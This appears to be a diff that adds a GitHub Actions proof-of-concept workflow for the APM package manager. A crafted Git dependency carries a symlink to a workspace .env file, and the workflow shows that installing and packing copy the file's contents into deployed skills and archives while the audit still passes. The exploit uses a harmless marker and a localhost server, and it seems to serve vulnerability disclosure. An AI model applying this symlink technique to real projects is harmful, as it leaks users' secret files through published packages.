@@ -1,0 +1,144 @@
+name: APM symlink materialization artifact PoC
+
+on:
+  workflow_dispatch:
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Create victim workspace
+        run: |
+          set -euo pipefail
+          mkdir -p victim
+          cd victim
+          printf 'CI_WORKSPACE_LOCAL_FILE_MARKER\n' > .env
+          echo "SAFE_MARKER_CREATED=true"
+
+      - name: Install APM from source
+        run: |
+          set -euo pipefail
+          python3 -m pip install -U pip
+          git clone --depth 1 --filter=blob:none https://github.com/microsoft/apm.git /tmp/apm
+          python3 -m pip install -e /tmp/apm
+          python3 -m apm_cli.cli --help
+
+      - name: Create attacker remote Git package locally
+        run: |
+          set -euo pipefail
+
+          POC="$RUNNER_TEMP/apm-symlink-ci"
+          mkdir -p "$POC/src/skillpkg/references" "$POC/http/owner"
+
+          cat > "$POC/src/skillpkg/SKILL.md" <<'EOF'
+          ---
+          name: ci-symlink-poc
+          description: CI symlink materialization PoC
+          ---
+
+          # CI Symlink PoC
+          EOF
+
+          ln -s "$GITHUB_WORKSPACE/victim/.env" "$POC/src/skillpkg/references/workspace-env.md"
+
+          git -C "$POC/src" init -q
+          git -C "$POC/src" config user.email poc@example.invalid
+          git -C "$POC/src" config user.name "APM PoC"
+          git -C "$POC/src" add skillpkg/SKILL.md skillpkg/references/workspace-env.md
+          git -C "$POC/src" commit -q -m "ci symlink package"
+
+          git clone --bare -q "$POC/src" "$POC/http/owner/repo.git"
+          git --git-dir="$POC/http/owner/repo.git" update-server-info
+
+          echo "POC=$POC" >> "$GITHUB_ENV"
+
+          echo "SOURCE_GIT_INDEX:"
+          git -C "$POC/src" ls-files -s
+          echo "SOURCE_SYMLINK_TARGET:"
+          git -C "$POC/src" cat-file -p HEAD:skillpkg/references/workspace-env.md
+          echo "SOURCE_HAS_MARKER_AS_REGULAR_FILE:"
+          git -C "$POC/src" grep -n "CI_WORKSPACE_LOCAL_FILE_MARKER" HEAD || true
+
+      - name: Serve local Git remote
+        run: |
+          set -euo pipefail
+          cd "$POC/http"
+          python3 -m http.server 8765 --bind 127.0.0.1 > "$RUNNER_TEMP/http.log" 2>&1 &
+          echo $! > "$RUNNER_TEMP/http.pid"
+          sleep 1
+          curl -s http://127.0.0.1:8765/owner/repo.git/HEAD
+
+      - name: Run APM install
+        working-directory: victim
+        run: |
+          set -euo pipefail
+
+          cat > apm.yml <<'EOF'
+          name: ci-victim
+          version: 0.0.0
+          dependencies:
+            apm:
+              - git: http://127.0.0.1:8765/owner/repo.git
+                path: skillpkg
+                allow_insecure: true
+          EOF
+
+          APM_E2E_TESTS=1 APM_NO_CACHE=1 \
+          python3 -m apm_cli.cli install \
+            --target agent-skills \
+            --allow-insecure \
+            --no-policy \
+            --verbose
+
+          DEPLOYED="$(find .agents/skills -path '*/references/workspace-env.md' | head -n 1)"
+
+          echo "DEPLOYED_PATH=$DEPLOYED"
+          echo "DEPLOYED_IS_SYMLINK=$([ -L "$DEPLOYED" ] && echo yes || echo no)"
+          echo "DEPLOYED_IS_REGULAR=$([ -f "$DEPLOYED" ] && [ ! -L "$DEPLOYED" ] && echo yes || echo no)"
+          grep -q "CI_WORKSPACE_LOCAL_FILE_MARKER" "$DEPLOYED"
+          echo "CI_WORKSPACE_MARKER_DEPLOYED=true"
+
+          echo "DEPLOYED_FILE_PROOF:"
+          ls -l "$DEPLOYED"
+          file "$DEPLOYED"
+          cat "$DEPLOYED"
+
+      - name: Pack APM archive
+        working-directory: victim
+        run: |
+          set -euo pipefail
+
+          python3 -m apm_cli.cli pack --format apm --archive --output build-apm-archive --verbose
+
+          ARCHIVE="$(find build-apm-archive -name '*.tar.gz' | head -n 1)"
+          echo "ARCHIVE=$ARCHIVE"
+
+          tar -tf "$ARCHIVE" | grep 'workspace-env.md'
+
+          mkdir -p /tmp/apm-archive-check
+          tar -xf "$ARCHIVE" -C /tmp/apm-archive-check
+
+          grep -Rsn "CI_WORKSPACE_LOCAL_FILE_MARKER" /tmp/apm-archive-check
+
+          echo "ARCHIVE_FILE_PROOF:"
+          find /tmp/apm-archive-check -path '*/references/workspace-env.md' \
+            -exec ls -l {} \; \
+            -exec file {} \; \
+            -exec cat {} \;
+
+      - name: Run APM audit
+        working-directory: victim
+        run: |
+          set -euo pipefail
+          python3 -m apm_cli.cli audit --ci
+          echo "APM_AUDIT_CI_PASSED=true"
+
+      - name: Upload harmless proof artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: apm-symlink-materialization-proof
+          path: |
+            victim/build-apm-archive/*.tar.gz
+            victim/.agents/skills/**
+            victim/apm.lock.yaml
